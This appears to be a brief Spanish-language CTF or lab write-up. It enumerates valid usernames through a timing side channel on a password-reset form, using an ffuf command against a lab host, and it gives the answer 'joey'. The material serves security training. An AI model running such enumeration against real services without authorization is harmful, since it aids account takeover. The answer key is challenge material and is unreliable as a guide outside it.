# Recon


![[Pasted image 20260415134840.png]]

La web en si al enviar un usuario siempre devuelve el mismo contenido en cuanto al tamaño respecta, sin embargo en el campo de `Forgot password?`, al enviar un email, el `delay` aumenta posiblemente, por lo que use `ffuf` para enumerar esto.


```bash
ffuf -w usernames.txt -u http://hunter.hs/reset -d "username=FUZZ" -H "Content-Type: application/x-www-form-urlencoded"

..snip..
leon                    [Status: 200, Size: 1984, Words: 468, Lines: 52, Duration: 244ms]
joey                    [Status: 200, Size: 1984, Words: 468, Lines: 52, Duration: 1070ms]
```

Respuesta: `joey`.
